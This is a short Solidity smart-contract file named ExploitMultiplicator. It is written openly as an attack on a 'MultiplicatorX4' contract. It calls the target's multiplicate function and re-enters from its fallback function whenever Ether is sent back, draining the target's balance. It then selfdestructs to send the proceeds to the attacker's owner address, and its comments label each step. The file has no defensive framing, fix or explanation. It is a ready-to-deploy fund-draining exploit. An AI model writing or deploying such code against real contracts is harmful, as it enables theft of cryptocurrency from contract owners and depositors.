pragma solidity ^0.4.18;

interface IMultiplicatorX4 {
    function multiplicate(address adr) external payable;
    function Command(address adr, bytes data) external payable;
}

contract ExploitMultiplicator {
    IMultiplicatorX4 public target;
    address public owner;

    constructor(address _target) public {
        target = IMultiplicatorX4(_target);
        owner = msg.sender;
    }

    // Step 1: Initiate the exploit
    function attack() external payable {
        require(msg.value > 0);
        target.multiplicate.value(msg.value)(address(this));
    }

    // Step 2: Re-enter during fallback when Ether is sent back
    function() public payable {
        if (address(target).balance >= msg.value) {
            // Reenter until funds drain
            target.multiplicate.value(msg.value)(address(this));
        } else {
            // Final transfer to attacker
            selfdestruct(owner);
        }
    }
}

